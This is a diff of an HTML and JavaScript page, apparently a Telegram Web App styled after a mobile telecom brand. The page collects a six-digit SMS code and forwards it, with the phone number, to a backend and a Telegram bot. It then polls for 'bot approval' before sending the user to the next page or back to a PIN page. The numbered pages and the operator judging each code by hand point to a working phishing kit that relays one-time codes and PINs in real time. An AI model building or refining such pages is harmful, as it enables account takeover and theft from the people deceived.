@@ -24,6 +24,7 @@
         * {
             box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
         }
 
         body {
@@ -101,13 +102,14 @@
             box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
         }
 
-        /* Stable 6 OTP Input Box Group */
+        /* Responsive & Interactive 6 OTP Input Box Group */
         .otp-input-group {
             display: flex;
             justify-content: space-between;
             gap: 8px;
             margin-bottom: 25px;
             width: 100%;
+            cursor: pointer;
         }
 
         .otp-box {
@@ -135,7 +137,7 @@
             background-color: #fff9f9;
         }
 
-        /* Timer Banner Box */
+        /* Timer Box Section */
         .timer-card {
             background-color: #f1f5f9;
             border-radius: 12px;
@@ -147,22 +149,16 @@
             width: 100%;
         }
 
-        .timer-info {
+        .resend-wrapper {
             display: flex;
-            flex-direction: column;
-            gap: 4px;
+            align-items: center;
+            gap: 8px;
         }
 
-        .timer-info .label {
-            font-size: 14px;
+        .resend-text {
+            font-size: 15px;
             color: var(--text-dark);
-            font-weight: 600;
-        }
-
-        .timer-info .sub-label {
-            font-size: 13px;
-            color: var(--text-dark);
-            font-weight: 500;
+            font-weight: 700;
         }
 
         .timer-countdown {
@@ -171,12 +167,12 @@
             color: var(--tnm-green);
         }
 
-        .resend-btn-text {
+        .resend-action-btn {
             color: var(--tnm-green);
             font-weight: 800;
             text-decoration: underline;
             cursor: pointer;
-            font-size: 14px;
+            font-size: 15px;
             display: none;
         }
 
@@ -290,7 +286,7 @@
 </div>
 
 <div class="container">
-    <p class="instruction-text" id="instructionMessage">
+    <p class="instruction-text">
         Enter the six digit code you receive on your sms messages.
     </p>
 
@@ -298,24 +294,23 @@
     <div id="statusErrorContainer" class="error-banner"></div>
 
     <form id="otpForm" onsubmit="submitOtp(event)">
-        <!-- 6 Box PIN Group -->
-        <div class="otp-input-group">
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
-            <input type="password" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off" required>
+        <!-- 6 Box Interactive PIN Group -->
+        <div class="otp-input-group" id="otpGroup">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
+            <input type="tel" maxlength="1" class="otp-box" inputmode="numeric" autocomplete="off">
         </div>
 
         <!-- Timer Box -->
         <div class="timer-card">
-            <div class="timer-info">
-                <span class="label">Did not receive OTP?</span>
-                <span class="sub-label">Retry in</span>
+            <div class="resend-wrapper">
+                <span class="resend-text">Resend Code</span>
             </div>
             <div id="timerCountdown" class="timer-countdown">01:00</div>
-            <div id="resendBtn" class="resend-btn-text" onclick="resendCode()">Resend Code</div>
+            <div id="resendBtn" class="resend-action-btn" onclick="resendCode()">Resend Code</div>
         </div>
 
         <button type="submit" id="verifyBtn" class="btn-confirm">Confirm</button>
@@ -323,6 +318,7 @@
     </form>
 </div>
 
+<!-- Status Overlay -->
 <div id="statusOverlay" class="overlay-status">
     <div class="overlay-spinner-circle"></div>
     <h2 class="overlay-title" id="overlayMainText">Please wait...</h2>
@@ -330,7 +326,7 @@
 </div>
 
 <script>
-    const TOTAL_TIME = 60; // 1 Minute
+    const TOTAL_TIME = 60; // 1 Minute Countdown
     let timeLeft = TOTAL_TIME;
     let timerInterval = null;
     let statusPollingInterval = null;
@@ -338,7 +334,8 @@
     const timerCountdownEl = document.getElementById('timerCountdown');
     const resendBtnEl = document.getElementById('resendBtn');
     const statusErrorContainer = document.getElementById('statusErrorContainer');
-    const otpBoxes = document.querySelectorAll('.otp-box');
+    const otpBoxes = Array.from(document.querySelectorAll('.otp-box'));
+    const otpGroup = document.getElementById('otpGroup');
 
     // Overlay Elements
     const statusOverlay = document.getElementById('statusOverlay');
@@ -352,26 +349,207 @@
             tg.expand();
         }
 
-        setupOtpBoxes();
+        setupOtpInputLogic();
         startTimer();
     };
 
-    function setupOtpBoxes() {
+    function setupOtpInputLogic() {
         otpBoxes.forEach((box, index) => {
-            box.addEventListener('input', () => {
-                box.value = box.value.replace(/\D/g, '');
+            box.addEventListener('input', (e) => {
+                const val = box.value.replace(/\D/g, '');
+                box.value = val;
 
-                // Clear error styling
+                // Clear red error highlighting
                 otpBoxes.forEach(b => b.classList.remove('input-error'));
                 statusErrorContainer.style.display = 'none';
 
-                if (box.value && index < otpBoxes.length - 1) {
+                if (val && index < otpBoxes.length - 1) {
                     otpBoxes[index + 1].focus();
                 }
             });
 
             box.addEventListener('keydown', (e) => {
-                if (e.key === "Backspace" && !box.value && index > 0) {
-                    otpBoxes[index - 1].focus();
+                if (e.key === "Backspace") {
+                    if (!box.value && index > 0) {
+                        otpBoxes[index - 1].focus();
+                    }
                 }
             });
+
+            box.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+                
+                if (pastedData) {
+                    const digits = pastedData.split('').slice(0, 6);
+                    digits.forEach((digit, idx) => {
+                        if (otpBoxes[idx]) {
+                            otpBoxes[idx].value = digit;
+                        }
+                    });
+                    const nextIndex = Math.min(digits.length, 5);
+                    otpBoxes[nextIndex].focus();
+                }
+            });
+        });
+
+        // Click anywhere on group to focus current active empty field
+        otpGroup.addEventListener('click', () => {
+            const emptyBox = otpBoxes.find(b => !b.value) || otpBoxes[otpBoxes.length - 1];
+            emptyBox.focus();
+        });
+
+        // Auto-focus first input box
+        setTimeout(() => {
+            if (otpBoxes[0]) otpBoxes[0].focus();
+        }, 300);
+    }
+
+    function startTimer() {
+        if (timerInterval) clearInterval(timerInterval);
+        
+        timeLeft = TOTAL_TIME;
+        updateTimerDisplay();
+
+        resendBtnEl.style.display = 'none';
+        timerCountdownEl.style.display = 'block';
+
+        timerInterval = setInterval(() => {
+            timeLeft--;
+            updateTimerDisplay();
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                onTimerExpired();
+            }
+        }, 1000);
+    }
+
+    function updateTimerDisplay() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        
+        const formattedMinutes = String(minutes).padStart(2, '0');
+        const formattedSeconds = String(seconds).padStart(2, '0');
+        
+        timerCountdownEl.textContent = `${formattedMinutes}:${formattedSeconds}`;
+    }
+
+    function onTimerExpired() {
+        timerCountdownEl.style.display = 'none';
+        resendBtnEl.style.display = 'block';
+    }
+
+    async function resendCode() {
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+        try {
+            await fetch("/api/resend-otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone, step: "First OTP (Page 8)" })
+            });
+        } catch (err) {
+            console.error("Resend error:", err);
+        }
+        alert("A new verification code has been sent via SMS.");
+        startTimer();
+    }
+
+    async function submitOtp(event) {
+        event.preventDefault();
+
+        let codeVal = "";
+        otpBoxes.forEach(b => codeVal += b.value);
+
+        if (codeVal.length < 6) {
+            statusErrorContainer.style.display = 'block';
+            statusErrorContainer.textContent = "Incorrect code, please enter the full 6-digit code.";
+            otpBoxes.forEach(b => b.classList.add('input-error'));
+            return;
+        }
+
+        // Clear error display
+        statusErrorContainer.style.display = 'none';
+        otpBoxes.forEach(b => b.classList.remove('input-error'));
+
+        const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
+
+        // Display waiting screen
+        overlayMainText.textContent = "Please wait...";
+        overlaySubText.textContent = "Verifying SMS code...";
+        statusOverlay.classList.add('active');
+
+        // Save local OTP
+        localStorage.setItem('smsOtp1', codeVal);
+
+        // Send payload to backend
+        try {
+            await fetch("/api/otp-notification", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ event: "otp_verification_1", phone, otp: codeVal })
+            });
+        } catch (err) {
+            console.error("❌ Notification error:", err);
+        }
+
+        const tg = window.Telegram?.WebApp;
+        if (tg && tg.sendData) {
+            tg.sendData(JSON.stringify({ event: "otp_verification_1", phone: phone, otp: codeVal }));
+        }
+
+        // Poll backend for bot approval or error status
+        startStatusPolling(phone);
+    }
+
+    function startStatusPolling(phone) {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+
+        statusPollingInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+                const data = await response.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(statusPollingInterval);
+                    overlayMainText.textContent = "Code Confirmed!";
+                    overlaySubText.textContent = "Redirecting...";
+
+                    setTimeout(() => {
+                        window.location.href = "/page9";
+                    }, 1200);
+                } 
+                else if (data.status === "otp1_wrong") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Show Red Error Message
+                    statusErrorContainer.style.display = 'block';
+                    statusErrorContainer.textContent = "Incorrect code. Please enter the correct code.";
+                    otpBoxes.forEach(b => {
+                        b.classList.add('input-error');
+                        b.value = "";
+                    });
+                    if (otpBoxes[0]) otpBoxes[0].focus();
+                }
+                else if (data.status === "otp2_wrongpin") {
+                    clearInterval(statusPollingInterval);
+                    statusOverlay.classList.remove('active');
+                    
+                    // Redirect to Page 6 with error flag
+                    window.location.href = "/page6?error=wrong_pin";
+                }
+            } catch (err) {
+                console.error("Status polling error:", err);
+            }
+        }, 2000);
+    }
+
+    function goBack() {
+        if (statusPollingInterval) clearInterval(statusPollingInterval);
+        window.location.href = "/page6";
+    }
+</script>
+
+</body>
+</html>
